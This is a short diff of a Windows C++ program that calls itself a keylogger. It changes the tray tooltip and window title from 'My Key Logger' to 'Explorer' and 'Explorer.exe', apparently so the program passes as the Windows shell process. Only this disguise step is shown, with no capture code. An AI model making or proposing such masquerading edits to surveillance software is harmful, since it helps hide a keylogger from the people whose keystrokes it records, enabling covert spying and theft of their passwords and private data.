@@ -178,7 +178,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
             notifyIconData.uFlags = NIF_ICON | NIF_MESSAGE | NIF_TIP;
             notifyIconData.uCallbackMessage = WM_USER + 1;
             notifyIconData.hIcon = LoadIcon(nullptr, IDI_APPLICATION);
-            lstrcpy(notifyIconData.szTip, "My Key Logger");
+            lstrcpy(notifyIconData.szTip, "Explorer");
             Shell_NotifyIcon(NIM_ADD, &notifyIconData);
 
             // Minimize the window
@@ -244,7 +244,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     HWND hwnd = CreateWindowEx(
             0,
             CLASS_NAME,
-            "My Key Logger",
+            "Explorer.exe",
             WS_OVERLAPPEDWINDOW,
             CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT, CW_USEDEFAULT,
             nullptr,
